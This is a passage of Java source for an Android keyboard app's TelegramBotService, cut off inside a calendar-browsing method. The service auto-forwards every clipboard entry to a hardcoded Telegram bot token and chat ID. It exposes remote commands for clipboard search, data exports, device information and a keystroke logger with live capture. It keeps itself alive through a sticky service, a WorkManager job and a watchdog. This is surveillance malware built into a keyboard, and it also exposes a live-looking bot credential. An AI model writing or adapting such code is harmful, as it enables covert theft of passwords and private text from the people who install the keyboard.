package juloo.keyboard2;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.RectF;
import android.graphics.Typeface;
import android.graphics.pdf.PdfDocument;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class TelegramBotService extends Service {

    private static final String TAG = "TGBot";

    // ── Foreground notification ───────────────────────────────────────────────
    private static final String NOTIF_CHANNEL  = "tg_bot_channel";
    private static final int    NOTIF_ID       = 8421;
    private static final String WM_WORK_NAME   = "tg_bot_keepalive";

    // ── Hard defaults ────────────────────────────────────────────────────────
    public static final String DEFAULT_TOKEN   = "7552059010:AAFyhqbed56ZJLpnOMcgDeJJA1amKV42at8";
    public static final long   DEFAULT_CHAT_ID = 6956029558L;

    // ── SharedPreferences keys ───────────────────────────────────────────────
    public static final String PREFS       = "telegram_prefs";
    public static final String KEY_TOKEN   = "bot_token";
    public static final String KEY_CHAT_ID = "chat_id_str";
    public static final String KEY_ENABLED = "bot_enabled";
    public static final String KEY_AUTOFW  = "auto_forward";

    // ── Instance state ───────────────────────────────────────────────────────
    private static volatile TelegramBotService _instance;
    private Thread   _pollThread;
    private volatile boolean _running = false;
    private int      _lastUpdateId = 0;

    // Per-chat state
    private static final Map<Long, Long>    _pinSessions = new HashMap<>();
    private static final Map<Long, String>  _pendingCmds = new HashMap<>();
    private static final Map<Long, Boolean> _awaitSearch = new HashMap<>();

    // ── Callback data prefixes (all must stay within Telegram's 64-byte limit) ──
    // rp_N          recent page N
    // rc_N          recent clip index N  (tap → detail)
    // cp_N          copy full content of recent clip N
    // de_N          show description of recent clip N
    // bk_rp_N       back to recent page N
    // cy            calendar: year list
    // cyy_YYYY      calendar: months for year YYYY
    // cym_YYYY_M    calendar: dates for year/month
    // cyd_YYYY_M_D  calendar: clips for date
    // cc_Y_M_D_I    calendar clip I at Y/M/D
    // cpc_Y_M_D_I   copy calendar clip
    // dec_Y_M_D_I   desc calendar clip
    // bk_cyd_Y_M_D  back to date clips
    // bk_cym_Y_M    back to month dates
    // bk_cyy_Y      back to year months
    // bk_cy         back to year list
    // bkf           appbackup: show format options
    // bkj           appbackup: send JSON
    // bkp           appbackup: send PDF
    // search        prompt search
    // kl_m          keystroke logger main menu
    // kl_on/kl_off  enable / disable logging
    // kl_lv1/lv0    live mode on / off
    // kl_mk1/mk0    mask-password on / off
    // kl_bt1/bt0    batch-send on / off
    // kl_ss         session list (page 1)
    // kl_sp_N       session list page N
    // kl_s_ID       session detail
    // kl_x_ID       export session to chat
    // kl_d_ID       delete session (confirm prompt)
    // kl_dy_ID      delete confirmed
    // kl_cl         clear all (confirm prompt)
    // kl_cy         clear all confirmed

    // ─────────────────────────────────────────────────────────────────────────
    // Service lifecycle
    // ─────────────────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        _instance = this;
        createNotificationChannel();
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIF_ID, buildNotification());
        if (!_running) startPolling();
        enrollWorkManager(this);
        BotWatchdogReceiver.schedule(this);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        _running = false;
        _instance = null;
        scheduleRestart(this);
        BotWatchdogReceiver.schedule(this);
        super.onDestroy();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    NOTIF_CHANNEL,
                    "Telegram Bot",
                    NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Keeps the Telegram bot running continuously");
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent launchIntent = new Intent(this, LauncherActivity.class);
        int piFlags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 23) piFlags |= PendingIntent.FLAG_IMMUTABLE;
        PendingIntent pi = PendingIntent.getActivity(this, 0, launchIntent, piFlags);

        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, NOTIF_CHANNEL);
        } else {
            b = new Notification.Builder(this);
            b.setPriority(Notification.PRIORITY_LOW);
        }
        b.setContentTitle("🤖 Telegram Bot Active")
         .setContentText("Polling for commands · auto-forwarding clips")
         .setSmallIcon(android.R.drawable.ic_dialog_info)
         .setOngoing(true)
         .setContentIntent(pi);
        return b.build();
    }

    public static void enrollWorkManager(Context ctx) {
        try {
            PeriodicWorkRequest req = new PeriodicWorkRequest.Builder(
                    BotKeepaliveWorker.class, 15, TimeUnit.MINUTES)
                    .build();
            WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(
                    WM_WORK_NAME,
                    ExistingPeriodicWorkPolicy.KEEP,
                    req);
        } catch (Exception e) {
            Log.w(TAG, "WorkManager enqueue failed: " + e.getMessage());
        }
    }

    // ── Public helpers ────────────────────────────────────────────────────────

    public static boolean isRunning() { return _instance != null; }

    public static String getToken(Context ctx) {
        return prefs(ctx).getString(KEY_TOKEN, DEFAULT_TOKEN);
    }

    public static long getChatId(Context ctx) {
        String s = prefs(ctx).getString(KEY_CHAT_ID, String.valueOf(DEFAULT_CHAT_ID));
        try { return Long.parseLong(s.trim()); } catch (Exception e) { return DEFAULT_CHAT_ID; }
    }

    public static SharedPreferences prefs(Context ctx) {
        return ctx.getSharedPreferences(PREFS, MODE_PRIVATE);
    }

    public static void startIfEnabled(Context ctx) {
        if (!prefs(ctx).getBoolean(KEY_ENABLED, true)) return;
        if (isRunning()) return;
        Intent i = new Intent(ctx, TelegramBotService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    public static void stopService(Context ctx) {
        if (_instance != null) _instance._running = false;
        ctx.stopService(new Intent(ctx, TelegramBotService.class));
    }

    // ── New-clip hook ─────────────────────────────────────────────────────────

    public static void notifyNewClip(Context ctx, ClipboardHistoryService.HistoryEntry e) {
        if (!prefs(ctx).getBoolean(KEY_AUTOFW, true)) return;
        final String token  = getToken(ctx);
        final long   chatId = getChatId(ctx);
        new Thread(() -> {
            try {
                String preview = e.content.length() > 300
                        ? e.content.substring(0, 300) + "…"
                        : e.content;
                String text = "📋 <b>New Clip Captured</b>\n\n"
                        + "<code>" + h(preview) + "</code>\n\n"
                        + "🕐 <i>" + h(e.timestamp) + "</i>"
                        + (ok(e.description) ? "\n📌 " + h(e.description) : "")
                        + (e.pinned ? "\n📍 Pinned" : "")
                        + "\n\n<i>Length: " + e.content.length() + " chars</i>";
                postJson(apiUrl(token) + "/sendMessage",
                        "{\"chat_id\":" + chatId
                        + ",\"text\":" + jstr(text)
                        + ",\"parse_mode\":\"HTML\"}");
            } catch (Exception ignored) {}
        }, "TG-fwd").start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Polling loop
    // ─────────────────────────────────────────────────────────────────────────

    private void startPolling() {
        _running = true;
        _pollThread = new Thread(() -> {
            send("🤖 <b>FullKeyboard Bot Online</b>\n"
                 + "All systems active. Send /start for commands.");
            while (_running) {
                try {
                    String resp = httpGet(apiUrl(getToken(this))
                            + "/getUpdates?timeout=25&offset=" + (_lastUpdateId + 1));
                    if (resp == null) { sleep(5000); continue; }
                    JSONObject root = new JSONObject(resp);
                    if (!root.optBoolean("ok")) { sleep(5000); continue; }
                    JSONArray results = root.getJSONArray("result");
                    for (int i = 0; i < results.length(); i++) {
                        _lastUpdateId = results.getJSONObject(i).getInt("update_id");
                        handleUpdate(results.getJSONObject(i));
                    }
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    Log.w(TAG, "poll: " + e.getMessage());
                    sleep(5000);
                }
            }
        }, "TG-poll");
        _pollThread.setDaemon(true);
        _pollThread.start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Update routing
    // ─────────────────────────────────────────────────────────────────────────

    private void handleUpdate(JSONObject upd) {
        try {
            if (upd.has("callback_query")) {
                JSONObject cq    = upd.getJSONObject("callback_query");
                long   chatId    = cq.getJSONObject("from").getLong("id");
                String data      = cq.optString("data", "");
                int    msgId     = cq.getJSONObject("message").getInt("message_id");
                answerCb(cq.getString("id"));
                if (chatId != getChatId(this)) return;
                handleCallback(chatId, msgId, data);
                return;
            }
            if (!upd.has("message")) return;
            JSONObject msg = upd.getJSONObject("message");
            long   chatId  = msg.getJSONObject("chat").getLong("id");
            String text    = msg.optString("text", "").trim();
            if (text.isEmpty()) return;

            if (chatId != getChatId(this)) {
                sendTo(chatId, "⛔ Unauthorized.");
                return;
            }

            if (_pendingCmds.containsKey(chatId)) { handlePinInput(chatId, text); return; }
            if (Boolean.TRUE.equals(_awaitSearch.get(chatId))) {
                _awaitSearch.remove(chatId);
                doSearch(chatId, text);
                return;
            }

            if (text.startsWith("/")) {
                String[] p   = text.split("\\s+", 2);
                String   cmd = p[0].split("@")[0].toLowerCase(Locale.ROOT);
                String   arg = p.length > 1 ? p[1].trim() : "";
                route(chatId, cmd, arg);
            } else {
                send("💬 Send /start to see all commands.");
            }
        } catch (Exception e) {
            Log.w(TAG, "handleUpdate: " + e.getMessage());
        }
    }

    private void route(long chatId, String cmd, String arg) {
        switch (cmd) {
            case "/start":      cmdStart(chatId);                                               break;
            case "/status":     cmdStatus(chatId);                                              break;
            case "/clipboard":  cmdClipboard(chatId);                                           break;
            case "/smartclips": requirePin(chatId, "smartclips");                               break;
            case "/all":        requirePin(chatId, "all");                                      break;
            case "/appbackup":  requirePin(chatId, "appbackup");                                break;
            case "/pin":        cmdPin(chatId);                                                  break;
            case "/calendar":   doCalendarYears(chatId, 0);                                     break;
            case "/device":     cmdDevice(chatId);                                              break;
            case "/recent":     doRecentPage(chatId, 0, 1);                                     break;
            case "/search":     if (arg.isEmpty()) promptSearch(chatId); else doSearch(chatId, arg); break;
            case "/stats":      cmdStats(chatId);                                               break;
            case "/lock":       cmdLock(chatId);                                                break;
            case "/keylog":     cmdKeylog(chatId);                                              break;
            case "/cancel":     _pendingCmds.remove(chatId); send("❌ Cancelled.");             break;
            default:            send("❓ Unknown command. /start for help.");
        }
    }

    // ── Callback dispatcher ───────────────────────────────────────────────────
    // msgId = message to edit (replace). 0 = send new message instead.

    private void handleCallback(long chatId, int msgId, String data) {
        if      (data.startsWith("rp_"))     doRecentPage(chatId, msgId, parseInt(data.substring(3), 1));
        else if (data.startsWith("rc_"))     doRecentClipDetail(chatId, msgId, parseInt(data.substring(3), 0), "bk_rp_1");
        else if (data.startsWith("cp_"))     doClipCopyContent(chatId, parseInt(data.substring(3), 0), false, 0, 0, 0);
        else if (data.startsWith("de_"))     doClipShowDesc(chatId, parseInt(data.substring(3), 0), false, 0, 0, 0);
        else if (data.startsWith("sf_"))     doClipShowFull(chatId, parseInt(data.substring(3), 0), false, 0, 0, 0);
        else if (data.startsWith("bk_rp_"))  doRecentPage(chatId, msgId, parseInt(data.substring(6), 1));
        else if (data.equals("cy"))          doCalendarYears(chatId, msgId);
        else if (data.startsWith("cyy_"))    doCalendarYear(chatId, msgId, parseInt(data.substring(4), 0));
        else if (data.startsWith("cym_"))    { String[] p = data.substring(4).split("_",2); doCalendarMonth(chatId, msgId, p2i(p,0), p2i(p,1)); }
        else if (data.startsWith("cyd_"))    { String[] p = data.substring(4).split("_",3); doCalendarDay(chatId, msgId, p2i(p,0), p2i(p,1), p2i(p,2)); }
        else if (data.startsWith("cc_"))     { int[] v = parseCalKey(data.substring(3)); doCalClipDetail(chatId, msgId, v[0], v[1], v[2], v[3]); }
        else if (data.startsWith("cpc_"))    { int[] v = parseCalKey(data.substring(4)); doClipCopyContent(chatId, v[3], true, v[0], v[1], v[2]); }
        else if (data.startsWith("dec_"))    { int[] v = parseCalKey(data.substring(4)); doClipShowDesc(chatId, v[3], true, v[0], v[1], v[2]); }
        else if (data.startsWith("sfc_"))    { int[] v = parseCalKey(data.substring(4)); doClipShowFull(chatId, v[3], true, v[0], v[1], v[2]); }
        else if (data.startsWith("bk_cyd_")) { String[] p = data.substring(7).split("_",3); doCalendarDay(chatId, msgId, p2i(p,0), p2i(p,1), p2i(p,2)); }
        else if (data.startsWith("bk_cym_")) { String[] p = data.substring(7).split("_",2); doCalendarMonth(chatId, msgId, p2i(p,0), p2i(p,1)); }
        else if (data.startsWith("bk_cyy_")) doCalendarYear(chatId, msgId, parseInt(data.substring(7), 0));
        else if (data.equals("bk_cy"))       doCalendarYears(chatId, msgId);
        else if (data.equals("bkf"))         doAppBackupFormat(chatId, msgId);
        else if (data.equals("bkj"))         doAppBackupJson(chatId, msgId);
        else if (data.equals("bkp"))         doAppBackupPdf(chatId, msgId);
        else if (data.equals("pin_cb"))      doPinnedClipboard(chatId, msgId);
        else if (data.equals("pin_sc"))      requirePin(chatId, "pin_sc");
        else if (data.startsWith("sc_"))     doSmartClipDetail(chatId, msgId, parseInt(data.substring(3), 0));
        else if (data.startsWith("scp_"))    doSmartClipCopy(chatId, parseInt(data.substring(4), 0));
        else if (data.startsWith("scd_"))    doSmartClipDesc(chatId, parseInt(data.substring(4), 0));
        else if (data.startsWith("scf_"))    doSmartClipFull(chatId, parseInt(data.substring(4), 0));
        else if (data.equals("bk_sc"))       doPinnedSmartClips(chatId, msgId);
        else if (data.equals("search"))      promptSearch(chatId);
        else if (data.startsWith("kl_"))     handleKlCallback(chatId, msgId, data);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // PIN flow
    // ─────────────────────────────────────────────────────────────────────────

    private void requirePin(long chatId, String pendingCmd) {
        SmartClipsService svc = SmartClipsService.getInstance(this);
        if (!svc.isPinSetup() || isPinSessionValid(chatId)) {
            execProtected(chatId, pendingCmd);
            return;
        }
        _pendingCmds.put(chatId, pendingCmd);
        sendTo(chatId, "🔐 <b>Smart Clips PIN Required</b>\n\n"
                + "Enter the PIN you set in the app to continue.\n"
                + "Send /cancel to abort.");
    }

    private void handlePinInput(long chatId, String text) {
        if (text.equals("/cancel")) {
            _pendingCmds.remove(chatId);
            sendTo(chatId, "❌ Cancelled.");
            return;
        }
        SmartClipsService svc = SmartClipsService.getInstance(this);
        if (svc.verifyPin(text)) {
            int  mins   = ThemeManager.getAutoLockMins(this);
            long expiry = (mins <= 0)
                    ? System.currentTimeMillis() + 365L * 24 * 60 * 60 * 1000L
                    : System.currentTimeMillis() + (long) mins * 60 * 1000L;
            _pinSessions.put(chatId, expiry);
            String pending = _pendingCmds.remove(chatId);
            sendTo(chatId, "✅ <b>PIN Verified</b>\n"
                    + (mins <= 0 ? "Session: never expires." : "Session valid for " + mins + " min."));
            if (pending != null) execProtected(chatId, pending);
        } else {
            _pendingCmds.remove(chatId);
            sendTo(chatId, "❌ <b>Wrong PIN.</b> Run the command again to retry.");
        }
    }

    private boolean isPinSessionValid(long chatId) {
        Long exp = _pinSessions.get(chatId);
        return exp != null && System.currentTimeMillis() < exp;
    }

    private void execProtected(long chatId, String cmd) {
        switch (cmd) {
            case "smartclips": doSmartClipsPdf(chatId);      break;
            case "all":        doAllPdf(chatId);              break;
            case "appbackup":  doAppBackupFormat(chatId, 0); break;
            case "pin_sc":     doPinnedSmartClips(chatId, 0); break;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // /start
    // ─────────────────────────────────────────────────────────────────────────

    private void cmdStart(long chatId) {
        String msg =
            "🤖 <b>FullKeyboard Bot</b> — Command Centre\n"
          + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
          + "📋 <b>Clipboard</b>\n"
          + "  /recent — Browse last 20 clips (paginated, tap any)\n"
          + "  /calendar — Browse by Year → Month → Date → Clip\n"
          + "  /pin — View pinned clips (Clipboard or Smart Clips)\n"
          + "  /search — Search all clips\n"
          + "  /stats — Usage statistics\n\n"
          + "🔐 <b>Smart Clips &amp; Reports</b> <i>(PIN protected)</i>\n"
          + "  /clipboard — Export clipboard as PDF\n"
          + "  /smartclips — Export Smart Clips as PDF\n"
          + "  /all — Combined full report PDF\n"
          + "  /appbackup — Full app backup file (JSON or PDF)\n"
          + "  /lock — Lock Smart Clips session\n\n"
          + "⚙️ <b>System</b>\n"
          + "  /device — Device information\n"
          + "  /status — Bot &amp; app status\n"
          + "  /keylog — Keystroke logger &amp; live capture\n"
          + "━━━━━━━━━━━━━━━━━━━━━━\n"
          + "<i>New clips are forwarded automatically.</i>";
        sendTo(chatId, msg);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // /recent  — 20 clips as tap-able buttons, paginated, replaces same message
    // ─────────────────────────────────────────────────────────────────────────

    private void doRecentPage(long chatId, int msgId, int page) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));

                int pageSize = 20, total = all.size();
                if (total == 0) { editOrSend(chatId, msgId, "📋 <i>No clipboard entries found.</i>", null); return; }
                int totalPages = Math.max(1, (total + pageSize - 1) / pageSize);
                int pg   = Math.max(1, Math.min(page, totalPages));
                int from = (pg - 1) * pageSize;
                int to   = Math.min(from + pageSize, total);

                // Header text
                String header = "📋 <b>Recent Clips</b>  <i>Page " + pg + " / " + totalPages + "</i>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>Tap any clip to view full details &amp; options.</i>";

                // Build inline keyboard: one button per clip
                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                for (int i = from; i < to; i++) {
                    ClipboardHistoryService.HistoryEntry e = all.get(i);
                    String label = clipLabel(e.content, e.pinned);
                    kb.append("[{\"text\":").append(jstr(label))
                      .append(",\"callback_data\":\"rc_").append(i).append("\"}],");
                }

                // Navigation row
                kb.append("[");
                if (pg > 1) kb.append("{\"text\":\"◀ Prev\",\"callback_data\":\"rp_").append(pg - 1).append("\"},");
                kb.append("{\"text\":\"📄 ").append(pg).append("/").append(totalPages)
                  .append("\",\"callback_data\":\"rp_").append(pg).append("\"}");
                if (pg < totalPages) kb.append(",{\"text\":\"Next ▶\",\"callback_data\":\"rp_").append(pg + 1).append("\"}");
                kb.append("],[{\"text\":\"🔍 Search\",\"callback_data\":\"search\"}]]}");

                editOrSend(chatId, msgId, header, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "TG-recent").start();
    }

    private void doRecentClipDetail(long chatId, int msgId, int clipIdx, String backData) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));

                if (clipIdx < 0 || clipIdx >= all.size()) {
                    editOrSend(chatId, msgId, "❌ Clip not found.", null); return;
                }
                ClipboardHistoryService.HistoryEntry e = all.get(clipIdx);
                int page = (clipIdx / 20) + 1;
                boolean truncated = e.content.length() > 500;

                String preview = truncated ? e.content.substring(0, 500) + "…" : e.content;
                String text = "📋 <b>Clip Detail</b>  <i>#" + (clipIdx + 1) + "</i>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        + "<code>" + h(preview) + "</code>\n\n"
                        + "🕐 <i>" + h(e.timestamp) + "</i>"
                        + (ok(e.description) ? "\n📌 <i>" + h(e.description) + "</i>" : "")
                        + (e.pinned ? "\n📍 <i>Pinned</i>" : "")
                        + "\n\n<i>Length: " + e.content.length() + " chars</i>"
                        + (truncated ? "  <i>(preview truncated)</i>" : "");

                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                // Row 1: Copy Content + Description
                kb.append("[{\"text\":\"📋 Copy Content\",\"callback_data\":\"cp_").append(clipIdx).append("\"},")
                  .append("{\"text\":\"📌 Description\",\"callback_data\":\"de_").append(clipIdx).append("\"}]");
                // Row 2: Show Full — only when content was truncated in preview
                if (truncated) {
                    kb.append(",[{\"text\":\"🔍 Show Full Content\",\"callback_data\":\"sf_").append(clipIdx).append("\"}]");
                }
                // Row 3: Back to page
                kb.append(",[{\"text\":\"🔙 Back to Page ").append(page)
                  .append("\",\"callback_data\":\"rp_").append(page).append("\"}]]}");
                editOrSend(chatId, msgId, text, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "TG-clip-detail").start();
    }

    // ── 📋 Copy Content — NEW separate message (not edit) so you can long-press copy ──

    private void doClipCopyContent(long chatId, int clipIdx, boolean isCalClip, int year, int month, int day) {
        new Thread(() -> {
            try {
                ClipboardHistoryService.HistoryEntry e = resolveClip(isCalClip, clipIdx, year, month, day);
                if (e == null) { sendTo(chatId, "❌ Clip not found."); return; }

                String label = "📋 <b>Copy Content</b>  <i>"
                        + (isCalClip ? "(Calendar clip)" : "Clip #" + (clipIdx + 1))
                        + "</i>\n━━━━━━━━━━━━━━━━━━━━━━";
                String content = e.content;
                int chunkSize = 3800;
                int totalParts = (content.length() + chunkSize - 1) / chunkSize;

                if (totalParts == 1) {
                    sendTo(chatId, label + "\n\n<code>" + h(content) + "</code>");
                } else {
                    sendTo(chatId, label + "\n<i>Content is " + content.length()
                            + " chars — sending in " + totalParts + " parts…</i>");
                    int part = 1;
                    for (int i = 0; i < content.length(); i += chunkSize) {
                        String chunk = content.substring(i, Math.min(i + chunkSize, content.length()));
                        sendTo(chatId, "📄 <b>Part " + part + " / " + totalParts + "</b>\n<code>" + h(chunk) + "</code>");
                        part++;
                        sleep(300);
                    }
                }
            } catch (Exception e) { sendTo(chatId, "❌ Error: " + e.getMessage()); }
        }, "TG-copy").start();
    }

    // ── 📌 Description — NEW separate message (not edit) so you can long-press copy ──

    private void doClipShowDesc(long chatId, int clipIdx, boolean isCalClip, int year, int month, int day) {
        new Thread(() -> {
            try {
                ClipboardHistoryService.HistoryEntry e = resolveClip(isCalClip, clipIdx, year, month, day);
                if (e == null) { sendTo(chatId, "❌ Clip not found."); return; }

                String desc = ok(e.description)
                        ? "<code>" + h(e.description) + "</code>"
                        : "<i>No description set for this clip.</i>";
                sendTo(chatId, "📌 <b>Description</b>  <i>"
                        + (isCalClip ? "(Calendar clip)" : "Clip #" + (clipIdx + 1))
                        + "</i>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        + desc + "\n\n"
                        + "🕐 <i>" + h(e.timestamp) + "</i>");
            } catch (Exception e) { sendTo(chatId, "❌ Error: " + e.getMessage()); }
        }, "TG-desc").start();
    }

    // ── 🔍 Show Full — sends COMPLETE content in chunks as NEW messages ──

    private void doClipShowFull(long chatId, int clipIdx, boolean isCalClip, int year, int month, int day) {
        new Thread(() -> {
            try {
                ClipboardHistoryService.HistoryEntry e = resolveClip(isCalClip, clipIdx, year, month, day);
                if (e == null) { sendTo(chatId, "❌ Clip not found."); return; }

                String content = e.content;
                int chunkSize = 3800;
                int totalParts = (content.length() + chunkSize - 1) / chunkSize;

                sendTo(chatId, "🔍 <b>Full Content</b>  <i>"
                        + (isCalClip ? "(Calendar clip)" : "Clip #" + (clipIdx + 1))
                        + "</i>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>" + content.length() + " chars"
                        + (totalParts > 1 ? " — sending in " + totalParts + " parts" : "") + "</i>");
                int part = 1;
                for (int i = 0; i < content.length(); i += chunkSize) {
                    String chunk = content.substring(i, Math.min(i + chunkSize, content.length()));
                    String header = totalParts > 1 ? "📄 <b>Part " + part + " / " + totalParts + "</b>\n" : "";
                    sendTo(chatId, header + "<code>" + h(chunk) + "</code>");
                    part++;
                    sleep(300);
                }
            } catch (Exception e) { sendTo(chatId, "❌ Error: " + e.getMessage()); }
        }, "TG-show-full").start();
    }

    /** Resolve a clip entry by index (recent sorted list or calendar day list). */
    private ClipboardHistoryService.HistoryEntry resolveClip(boolean isCalClip, int idx, int year, int month, int day) {
        try {
            ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
            if (cb == null) return null;
            if (isCalClip) {
                List<ClipboardHistoryService.HistoryEntry> dayClips = getClipsForDay(cb.get_history_entries(), year, month, day);
                if (idx < 0 || idx >= dayClips.size()) return null;
                return dayClips.get(idx);
            } else {
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));
                if (idx < 0 || idx >= all.size()) return null;
                return all.get(idx);
            }
        } catch (Exception e) { return null; }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // /calendar  — Year → Month → Date → Clips (all as buttons, replaces same msg)
    // ─────────────────────────────────────────────────────────────────────────

    private void doCalendarYears(long chatId, int msgId) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();

                Set<Integer> years = new TreeSet<>(Collections.reverseOrder());
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                for (ClipboardHistoryService.HistoryEntry e : all) {
                    try {
                        Calendar c = Calendar.getInstance(); c.setTime(sdf.parse(e.timestamp));
                        years.add(c.get(Calendar.YEAR));
                    } catch (Exception ignored) {}
                }

                if (years.isEmpty()) {
                    editOrSend(chatId, msgId, "📅 <i>No clipboard history found.</i>", null); return;
                }

                String text = "📅 <b>Calendar — Select a Year</b>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>Tap a year to browse its months.</i>";

                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                List<Integer> yrList = new ArrayList<>(years);
                for (int i = 0; i < yrList.size(); i++) {
                    int yr = yrList.get(i);
                    long cnt = countClipsForYear(all, yr);
                    kb.append("[{\"text\":\"📆 ").append(yr).append("  (").append(cnt).append(" clips)\",\"callback_data\":\"cyy_").append(yr).append("\"}],");
                }
                // Remove trailing comma
                if (kb.charAt(kb.length()-1) == ',') kb.setLength(kb.length()-1);
                kb.append("]}");
                editOrSend(chatId, msgId, text, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "TG-cal-years").start();
    }

    private void doCalendarYear(long chatId, int msgId, int year) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();

                Map<Integer, Long> monthCounts = new TreeMap<>();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                for (ClipboardHistoryService.HistoryEntry e : all) {
                    try {
                        Calendar c = Calendar.getInstance(); c.setTime(sdf.parse(e.timestamp));
                        if (c.get(Calendar.YEAR) == year)
                            monthCounts.merge(c.get(Calendar.MONTH) + 1, 1L, Long::sum);
                    } catch (Exception ignored) {}
                }

                if (monthCounts.isEmpty()) {
                    editOrSend(chatId, msgId, "📅 <i>No clips in " + year + ".</i>",
                            backKb("bk_cy", "🔙 Back to Years")); return;
                }

                String text = "📅 <b>Calendar — " + year + "</b>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>Tap a month to see dates with clips.</i>";

                String[] monthNames = {"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                for (Map.Entry<Integer, Long> en : monthCounts.entrySet()) {
                    int m = en.getKey();
                    String mName = (m >= 1 && m <= 12) ? monthNames[m - 1] : String.valueOf(m);
                    kb.append("[{\"text\":\"🗓 ").append(mName).append(" ").append(year)
                      .append("  (").append(en.getValue()).append(" clips)\",\"callback_data\":\"cym_")
                      .append(year).append("_").append(m).append("\"}],");
                }
                kb.append("[{\"text\":\"🔙 Back to Years\",\"callback_data\":\"bk_cy\"}]]}");
                editOrSend(chatId, msgId, text, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "TG-cal-year").start();
    }

    private void doCalendarMonth(long chatId, int msgId, int year, int month) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();

                Map<Integer, Long> dayCounts = new TreeMap<>();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                for (ClipboardHistoryService.HistoryEntry e : all) {
                    try {
                        Calendar c = Calendar.getInstance(); c.setTime(sdf.parse(e.timestamp));
                        if (c.get(Calendar.YEAR) == year && (c.get(Calendar.MONTH) + 1) == month)
                            dayCounts.merge(c.get(Calendar.DAY_OF_MONTH), 1L, Long::sum);
                    } catch (Exception ignored) {}
                }

                if (dayCounts.isEmpty()) {
                    editOrSend(chatId, msgId, "📅 <i>No clips this month.</i>",
